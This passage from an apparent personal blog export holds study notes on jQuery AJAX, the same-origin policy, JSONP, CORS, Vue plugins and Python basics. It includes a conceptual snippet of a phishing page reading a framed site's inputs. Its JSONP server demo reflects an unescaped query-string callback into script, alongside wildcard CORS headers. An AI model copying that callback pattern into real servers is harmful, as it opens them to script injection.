<h1 id="jQuery"><a href="#jQuery" class="headerlink" title="jQuery"></a>jQuery</h1><h2 id="GET請求-1"><a href="#GET請求-1" class="headerlink" title="GET請求"></a>GET請求</h2><ol>
<li><p>完整版：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">    <span class="attr">url</span>: <span class="string">&#x27;http://127.0.0.1:8080/test_jquery_get&#x27;</span>,   <span class="comment">// 請求地址</span></span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;GET&#x27;</span>,                                  <span class="comment">// 請求方式（默認值GET）</span></span><br><span class="line">    <span class="attr">dataType</span>: <span class="string">&#x27;json&#x27;</span>,                               <span class="comment">// 配置響應數據格式</span></span><br><span class="line">    <span class="attr">data</span>: &#123;&#125;,                                       <span class="comment">// 攜帶的數據</span></span><br><span class="line">    <span class="attr">timeout</span>: <span class="number">2000</span>,                                  <span class="comment">// 指定超時時間</span></span><br><span class="line">    <span class="attr">success</span>: <span class="function">(<span class="params">result, responseText, xhr</span>) =&gt;</span> &#123;       <span class="comment">// 成功的回調</span></span><br><span class="line">        result          <span class="comment">// 服務器的響應數據</span></span><br><span class="line">        responseText    <span class="comment">// 響應結果 (success)</span></span><br><span class="line">        xhr             <span class="comment">// xhr 構造函數</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">error</span>: <span class="function">() =&gt;</span> &#123;&#125;,                                <span class="comment">// 失敗的回調</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

</li>
<li><p>精簡版：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$.<span class="title function_">get</span>(<span class="string">&#x27;http://127.0.0.1:8080/test_jquery_get&#x27;</span>, &#123;&#125;, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(data)</span><br><span class="line">&#125;,<span class="string">&#x27;json&#x27;</span>)</span><br></pre></td></tr></table></figure>

</li>
<li><p>備註：攜帶的數據默認是<code>query</code>格式，可以使用<code>params</code>格式，不過要在<code>url</code>和服務器追加上追加</p>
</li>
</ol>
<h2 id="POST請求-1"><a href="#POST請求-1" class="headerlink" title="POST請求"></a>POST請求</h2><ol>
<li><p>完整版：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">    <span class="attr">url</span>: <span class="string">&#x27;http://127.0.0.1:8080/test_jquery_post&#x27;</span>,  <span class="comment">// 請求地址</span></span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,                                 <span class="comment">// 請求方式（默認值GET）</span></span><br><span class="line">    <span class="attr">dataType</span>: <span class="string">&#x27;json&#x27;</span>,                               <span class="comment">// 配置響應數據格式</span></span><br><span class="line">    <span class="attr">data</span>: &#123;&#125;,                                       <span class="comment">// 攜帶的數據</span></span><br><span class="line">    <span class="attr">timeout</span>: <span class="number">2000</span>,                                  <span class="comment">// 指定超時時間</span></span><br><span class="line">    <span class="attr">success</span>: <span class="function">(<span class="params">result, responseText, xhr</span>) =&gt;</span> &#123;       <span class="comment">// 成功的回調</span></span><br><span class="line">        result          <span class="comment">// 服務器的響應數據</span></span><br><span class="line">        responseText    <span class="comment">// 響應結果 (success)</span></span><br><span class="line">        xhr             <span class="comment">// xhr 構造函數</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">error</span>: <span class="function">() =&gt;</span> &#123;&#125;,                                <span class="comment">// 失敗的回調</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

</li>
<li><p>精簡版：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$.<span class="title function_">post</span>(<span class="string">&#x27;http://127.0.0.1:8080/test_jquery_post&#x27;</span>, &#123;&#125;, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(data)</span><br><span class="line">&#125;,<span class="string">&#x27;json&#x27;</span>)</span><br></pre></td></tr></table></figure>

</li>
<li><p>備註：攜帶的數據默認是<code>query</code>格式，可以使用<code>params</code>格式，不過要在<code>url</code>和服務器追加上追加</p>
</li>
</ol>
]]></content>
      <categories>
        <category>AJAX</category>
      </categories>
      <tags>
        <tag>AJAX</tag>
      </tags>
  </entry>
  <entry>
    <title>CORS</title>
    <url>/myBlog/2022/08/02/2022/2022-8-2-CORS/</url>
    <content><![CDATA[<h1 id="AJAX跨域問題"><a href="#AJAX跨域問題" class="headerlink" title="AJAX跨域問題"></a>AJAX跨域問題</h1><h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><ol>
<li><p>簡介：</p>
<ul>
<li>同源策略 (Same-Origin-Policy) 由 Netscape 提出的一個安全策略，如今所有支持 JavaScript 的瀏覽器都會使用這個策略</li>
<li>Web 是建構在同源策略基礎之上，瀏覽器只是針對同源策略的一種實現</li>
<li>同源：協議、域名(IP)、端口<font color="#f54747">必須完全相同</font><br>  即：協議、域名、端口都相同，才能算是在同一個域裡</li>
</ul>
</li>
<li><p>例子：</p>
<ul>
<li>假設已有網站地址：<a href="http://study.com/">http://study.com</a><table>
<thead>
<tr>
<th>請求地址</th>
<th align="center">形式</th>
<th align="center">結果</th>
</tr>
</thead>
<tbody><tr>
<td><a href="http://study.com/test/a.html">http://study.com/test/a.html</a></td>
<td align="center">協議、域名、端口相同</td>
<td align="center">成功</td>
</tr>
<tr>
<td><a href="http://study.com/user/a.html">http://study.com/user/a.html</a></td>
<td align="center">協議、域名、端口相同</td>
<td align="center">成功</td>
</tr>
<tr>
<td><a href="http://a.study.com/test/a.html">http://a.study.com/test/a.html</a></td>
<td align="center">域名不同</td>
<td align="center">失敗</td>
</tr>
<tr>
<td><a href="http://study.com:8080/test/a.html">http://study.com:8080/test/a.html</a></td>
<td align="center">端口不同</td>
<td align="center">失敗</td>
</tr>
<tr>
<td><a href="https://study.com/test/a.html">https://study.com/test/a.html</a></td>
<td align="center">協議不同</td>
<td align="center">失敗</td>
</tr>
</tbody></table>
</li>
</ul>
</li>
<li><p>沒有同源策略的危險性：</p>
<ul>
<li>釣魚網站模擬登錄頁面，如果沒有同源策略，就可以即時使用 AJAX 竊取用戶輸入的帳號與密碼</li>
<li>例子：  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">&quot;google&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://www.google.com&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> iframe = <span class="variable language_">window</span>.<span class="property">iframe</span>[<span class="string">&#x27;google&#x27;</span>]</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> inputNode = iframe.<span class="property">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;xxx&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>非同源收到的限制：</p>
<ol>
<li>Cookie 不可讀取</li>
<li>DOM 無法獲取</li>
<li>Ajax 請求不能獲取數據</li>
</ol>
</li>
</ol>
<h2 id="JSONP解決跨域"><a href="#JSONP解決跨域" class="headerlink" title="JSONP解決跨域"></a>JSONP解決跨域</h2><ol>
<li><p>簡介：</p>
<ul>
<li>JSONP (JSON with Padding) 是一個非官方的跨域解決方案，純粹憑藉程序員的聰明才發出來</li>
<li><font color="#f54747">只支持GET請求</font></li>
</ul>
</li>
<li><p>JSONP原理：</p>
<ul>
<li>繞過<code>xhr</code>，借助<code>script</code>發請求不受同源策略的限制把數據傳遞</li>
</ul>
</li>
<li><p>基本使用：</p>
<ul>
<li>在後端服務器上響應一個函數，數據作為函數的參數（以<code>JSON.stringify</code>轉成字符串）</li>
<li>在前端定義一個重名的函數，然後以<code>script</code>標籤發送請求</li>
<li>服務器編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/test_jsonp/&#x27;</span>, <span class="function">(<span class="params">request, response</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> person = [&#123;<span class="attr">name</span>:<span class="string">&#x27;Donald&#x27;</span>, <span class="attr">age</span>:<span class="number">18</span>&#125;]</span><br><span class="line">    response.<span class="title function_">send</span>(<span class="string">`demo(<span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(person)&#125;</span>)`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">btn.<span class="property">onclick</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 1. 創建 script 節點</span></span><br><span class="line">    <span class="keyword">const</span> scriptNode = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>)</span><br><span class="line">    <span class="comment">// 2. 給節點指定 src 屬性</span></span><br><span class="line">    scriptNode.<span class="property">src</span> = <span class="string">&#x27;http://127.0.0.1:8080/test_jsonp&#x27;</span></span><br><span class="line">    <span class="comment">// 3. 將節點放入頁面</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(scriptNode)</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">demo</span> = <span class="function">(<span class="params">person</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(person)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>優化：</p>
<ul>
<li>基於使用 JSONP 必須要前後端定義同一個函數名，前端可以使用<code>query</code>形式傳遞函數名給後端，後端基於此函數名響應函數</li>
<li>服務器編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 優化一、動態創建函數名</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/test_jsonp/&#x27;</span>, <span class="function">(<span class="params">request, response</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;callback&#125; = request.<span class="property">query</span></span><br><span class="line">    <span class="keyword">const</span> person = [&#123;<span class="attr">name</span>:<span class="string">&#x27;Donald&#x27;</span>, <span class="attr">age</span>:<span class="number">18</span>&#125;]</span><br><span class="line">    response.<span class="title function_">send</span>(<span class="string">`<span class="subst">$&#123;callback&#125;</span>(<span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(person)&#125;</span>)`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">scriptNode.<span class="property">src</span> = <span class="string">&#x27;http://127.0.0.1:8080/test_jsonp?callback=test&#x27;</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">test</span> = <span class="function">(<span class="params">person</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(person)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 優化二、移除已經使用過的 script 節點</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">removeChild</span>(scriptNode)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>jQuery封裝的JSONP</p>
<ul>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$.<span class="title function_">getJSON</span>(<span class="string">&#x27;http://127.0.0.1:8080/test_jsonp?callback=?&#x27;</span>, &#123;<span class="attr">name</span>: <span class="string">&#x27;Tom&#x27;</span>&#125;, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(data)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h2><ol>
<li><p>簡介：</p>
<ul>
<li>CORS (Cross-Origin Resource Sharing) 跨域資源共享，CORS 是官方的跨域解決方案</li>
<li>它的特點在於<font color="#f54747">不需要在客戶端做任何特殊的操作，完全在服務器中進行處理</font>，支持所有常見請求</li>
</ul>
</li>
<li><p>配置響應頭：</p>
<ol>
<li><p>允許獲取數據：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">response.<span class="title function_">setHeader</span>(<span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>, <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>)</span><br><span class="line">response.<span class="title function_">setHeader</span>(<span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>, <span class="string">&#x27;*&#x27;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>允許獲取響應頭：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">response.<span class="title function_">setHeader</span>(<span class="string">&#x27;Access-Control-Expose-Headers&#x27;</span>, <span class="string">&#x27;*&#x27;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>允許複雜請求：</p>
<ul>
<li>由於<code>PUT</code>和<code>DELETE</code>這些複雜請求在真正請求之前會發送一個預請求，因此要對預請求也配置響應頭 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 響應PUT請求</span></span><br><span class="line">app.<span class="title function_">put</span>(<span class="string">&#x27;/test_put&#x27;</span>, <span class="function">(<span class="params">request, response</span>) =&gt;</span> &#123;</span><br><span class="line">    response.<span class="title function_">setHeader</span>(<span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>, <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">    response.<span class="title function_">setHeader</span>(<span class="string">&#x27;Access-Control-Expose-Headers&#x27;</span>, <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">    response.<span class="title function_">send</span>(<span class="string">&#x27;hello_test_put&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 響應預請求</span></span><br><span class="line">app.<span class="title function_">options</span>(<span class="string">&#x27;/test_put&#x27;</span>, <span class="function">(<span class="params">request, response</span>) =&gt;</span> &#123;</span><br><span class="line">    response.<span class="title function_">setHeader</span>(<span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>, <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">    response.<span class="title function_">setHeader</span>(<span class="string">&#x27;Access-Control-Expose-Headers&#x27;</span>, <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">    response.<span class="title function_">setHeader</span>(<span class="string">&#x27;Access-Control-Allow-Methods&#x27;</span>, <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">    response.<span class="title function_">send</span>()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
</li>
<li><p>使用<code>cors</code>中間件</p>
<ol>
<li><p>安裝：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn add cors</span><br></pre></td></tr></table></figure>
</li>
<li><p>導入、註冊並使用：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> cors = <span class="built_in">require</span>(<span class="string">&#x27;cors&#x27;</span>)</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cors</span>())</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>重點：</p>
<ol>
<li>前端人員無需進行任何特殊操作</li>
<li>用<code>cors</code>解決跨域不是設置一兩個響應頭就能解決</li>
<li><code>PUT</code>和<code>DELETE</code>請求都是複雜請求，這些請求在真正請求之前必須進行一次預請求</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>AJAX</category>
      </categories>
      <tags>
        <tag>AJAX</tag>
        <tag>CORS</tag>
      </tags>
  </entry>
  <entry>
    <title>VueJS Dependency - Vue-Animate-Onscroll</title>
    <url>/myBlog/2022/08/23/2022/2022-8-23-PS-AnimationOnscroll/</url>
    <content><![CDATA[<h2 id="vue-animate-onscroll"><a href="#vue-animate-onscroll" class="headerlink" title="vue-animate-onscroll"></a>vue-animate-onscroll</h2><p>A simple Vue directive that animates elements as they scroll into view.</p>
<h3 id="Installation-and-Setup"><a href="#Installation-and-Setup" class="headerlink" title="Installation and Setup"></a>Installation and Setup</h3><ol>
<li><p>animate.css</p>
<ul>
<li><p>remember to install or import <code>animate.css</code> first.</p>
</li>
<li><p>install</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i v-animate-css</span><br></pre></td></tr></table></figure>
</li>
<li><p>setup in <code>main.js</code></p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">VAnimateCss</span> <span class="keyword">from</span> <span class="string">&#x27;v-animate-css&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">VAnimateCss</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>vue-animate-onscroll</p>
<ul>
<li><p>install</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install vue-animate-onscroll</span><br></pre></td></tr></table></figure>
</li>
<li><p>setup in <code>main.js</code></p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">VueAnimateOnscoll</span> <span class="keyword">from</span> <span class="string">&#x27;vue-animate-onscroll&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">VueAnimateOnscoll</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h3><ol>
<li><p>Bind</p>
<ul>
<li>use <code>v-animate-onscroll</code> to bind for a element  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-animate-onscroll</span>=<span class="string">&quot;&#x27;animated fadeIn&#x27;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Effect</p>
<ul>
<li>the effect name is totally same with <a href="https://animate.style/">animate.css</a></li>
<li>examples:  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-animate-onscroll</span>=<span class="string">&quot;&#x27;animated fadeIn&#x27;&quot;</span>&gt;</span>fadeIn<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-animate-onscroll</span>=<span class="string">&quot;&#x27;animated backInDown&#x27;&quot;</span>&gt;</span>backInDown<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>ProblemSolving</category>
      </categories>
  </entry>
  <entry>
    <title>VueJS Implement - Images Gradient</title>
    <url>/myBlog/2022/08/20/2022/2022-8-20-PS-ImagesGradient/</url>
    <content><![CDATA[<h2 id="Images-Gradient-in-Vue2"><a href="#Images-Gradient-in-Vue2" class="headerlink" title="Images Gradient in Vue2"></a>Images Gradient in Vue2</h2><p>Realize image gradient effect in Vue2.</p>
<h3 id="Template"><a href="#Template" class="headerlink" title="Template"></a>Template</h3><ol>
<li>Use <transition-group> as a wrapper for setting the gradient animations.</li>
<li>Use <code>v-for</code> directive to traverse the list of images.</li>
<li>Use <code>v-show</code> directive to show the current image and hide the others images.</li>
<li>Use <code>:style</code> directive to bind a background-image style for each <div> and display each images as a background-image of the <div>.</li>
</ol>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">transition-group</span> <span class="attr">tag</span>=<span class="string">&quot;ul&quot;</span> <span class="attr">name</span>=<span class="string">&quot;img&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span></span></span><br><span class="line"><span class="tag">        <span class="attr">class</span>=<span class="string">&quot;image-container&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">v-for</span>=<span class="string">&quot;(img, index) in imgArr&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">v-show</span>=<span class="string">&quot;index === currIndex&quot;</span></span></span><br><span class="line"><span class="tag">    &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;image&quot;</span> <span class="attr">:style</span>=<span class="string">&quot;&#123;&#x27;background-image&#x27;: &#x27;url(&#x27; + i + &#x27;)&#x27;&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">transition-group</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="Data"><a href="#Data" class="headerlink" title="Data"></a>Data</h3><ol>
<li><code>currIndex</code>, represent the index of current image.</li>
<li><code>imgArr</code>, which saved the relative link of all images.</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">currIndex</span>: <span class="number">0</span>,</span><br><span class="line"><span class="attr">imgArr</span>: [</span><br><span class="line">    <span class="built_in">require</span>(<span class="string">&#x27;../../assets/background/A01.webp&#x27;</span>),</span><br><span class="line">    <span class="built_in">require</span>(<span class="string">&#x27;../../assets/background/A02.webp&#x27;</span>),</span><br><span class="line">    <span class="built_in">require</span>(<span class="string">&#x27;../../assets/background/A03.webp&#x27;</span>),</span><br><span class="line">    <span class="built_in">require</span>(<span class="string">&#x27;../../assets/background/A04.webp&#x27;</span>),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<ul>
<li>Notice: <font color="#f54747">Remember to use <code>require()</code> to parse the relative link, otherwise it can’t get the images</font></li>
</ul>
<h3 id="Methods"><a href="#Methods" class="headerlink" title="Methods"></a>Methods</h3><ul>
<li><code>autoPlay</code>, a method to update the currIndex in each n seconds.</li>
<li>Call the method when the component is mounted.<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">methods</span>: &#123;</span><br><span class="line">    <span class="title function_">autoPlay</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">currIndex</span> = (<span class="variable language_">this</span>.<span class="property">currIndex</span> &lt; <span class="variable language_">this</span>.<span class="property">imgArr</span>.<span class="property">length</span> - <span class="number">1</span>) ? <span class="variable language_">this</span>.<span class="property">currIndex</span> + <span class="number">1</span> : <span class="number">0</span></span><br><span class="line">        &#125;, <span class="number">4000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="title function_">mounted</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">autoPlay</span>()</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Styles"><a href="#Styles" class="headerlink" title="Styles"></a>Styles</h3><ul>
<li>Apply the animation: set the <code>opacity</code>, <code>transition</code> and <code>z-index</code> for the entering and leaving element.<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.img-enter-active</span> &#123;</span><br><span class="line">    <span class="attribute">transition</span>: opacity <span class="number">3s</span> ease;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.img-leave-active</span> &#123;</span><br><span class="line">    <span class="attribute">transition</span>: <span class="number">3s</span>;</span><br><span class="line">    <span class="attribute">z-index</span>: -<span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.img-enter</span>&#123;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.img-enter-to</span>&#123;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>ProblemSolving</category>
      </categories>
  </entry>
  <entry>
    <title>VueJS Dependency - Easy-Circular-Progress</title>
    <url>/myBlog/2022/08/24/2022/2022-8-24-PS-EasyCircularProgress/</url>
    <content><![CDATA[<h2 id="easy-circular-progress"><a href="#easy-circular-progress" class="headerlink" title="easy-circular-progress"></a>easy-circular-progress</h2><p>To create a circular-progress-bar</p>
<h3 id="Installation-and-Setup"><a href="#Installation-and-Setup" class="headerlink" title="Installation and Setup"></a>Installation and Setup</h3><ol>
<li>circular-progress-bar<ul>
<li><p>install</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install circular-progress-bar</span><br></pre></td></tr></table></figure>
</li>
<li><p>import in components</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Progress</span> <span class="keyword">from</span> <span class="string">&#x27;easy-circular-progress/src/index.vue&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="Prop-Types"><a href="#Prop-Types" class="headerlink" title="Prop Types"></a>Prop Types</h3><table>
<thead>
<tr>
<th align="left">Property</th>
<th align="left">Type</th>
<th align="left">Description</th>
</tr>
</thead>
<tbody><tr>
<td align="left">strokeWidth</td>
<td align="left">Number</td>
<td align="left">the width of the progress circle</td>
</tr>
<tr>
<td align="left">radius</td>
<td align="left">Number</td>
<td align="left">the inner circle radius</td>
</tr>
<tr>
<td align="left">transitionDuration</td>
<td align="left">Number</td>
<td align="left">transitionDuration for the animation</td>
</tr>
<tr>
<td align="left">strokeColors</td>
<td align="left">String</td>
<td align="left">e.g. ‘#aaff00’</td>
</tr>
<tr>
<td align="left">value</td>
<td align="left">Number</td>
<td align="left">Progress Length, between 0 and 100</td>
</tr>
</tbody></table>
<ol>
<li><code>value</code>: <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">Progress</span></span></span><br><span class="line"><span class="tag">    <span class="attr">class</span>=<span class="string">&quot;progress-bar&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">:value</span>=<span class="string">&quot;30&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">:strokeColor</span>=<span class="string">&quot;i.color&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">:strokeWidth</span>=<span class="string">&quot;10&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">:radius</span>=<span class="string">&quot;50&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">:transitionDuration</span>=<span class="string">&quot;2000&quot;</span></span></span><br><span class="line"><span class="tag">/&gt;</span></span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>ProblemSolving</category>
      </categories>
  </entry>
  <entry>
    <title>Python - Basic</title>
    <url>/myBlog/2022/08/28/2022/2022-8-28-Python-Basic/</url>
    <content><![CDATA[<h2 id="Print-amp-Input"><a href="#Print-amp-Input" class="headerlink" title="Print &amp; Input"></a>Print &amp; Input</h2><ol>
<li>接收用戶輸入<ul>
<li>使用<code>input</code>方法  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">temp = <span class="built_in">input</span>(<span class="string">&#x27;Guess a number&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="字符串語法"><a href="#字符串語法" class="headerlink" title="字符串語法"></a>字符串語法</h2><ol>
<li><p>原始字符串<code>r</code></p>
<ul>
<li>在字符串的前面加上一個<code>r</code>，則表示原始字符串，轉譯字符則不再有效  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">r&quot;Hello World \n&quot;</span>)    <span class="comment"># Hello World \n</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>長字符串</p>
<ul>
<li>專門用於實現跨行字符串  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Hello World 1</span></span><br><span class="line"><span class="string">Hello World 2</span></span><br><span class="line"><span class="string">Hello World 3</span></span><br><span class="line"><span class="string">Hello World 4</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>字符串乘法複製</p>
<ul>
<li>將字符串重複指定次數  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;HelloWorld &#x27;</span> * <span class="number">3</span>)    <span class="comment"># HelloWorld HelloWorld HelloWorld </span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="random-module"><a href="#random-module" class="headerlink" title="random module"></a>random module</h2><ol>
<li><p>生成隨機整數：</p>
<ul>
<li><code>random.randint(a,b)</code>隨機生成 a - b 的函數  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">random.randint(<span class="number">1</span>, <span class="number">10</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>獲取偽隨機數攻擊：</p>
<ul>
<li>使用<code>random.getstate()</code>獲取隨機數種子加工後隨機數生成器內部狀態</li>
<li>使用<code>random.setstate()</code>設置隨機數生成器的內部狀態</li>
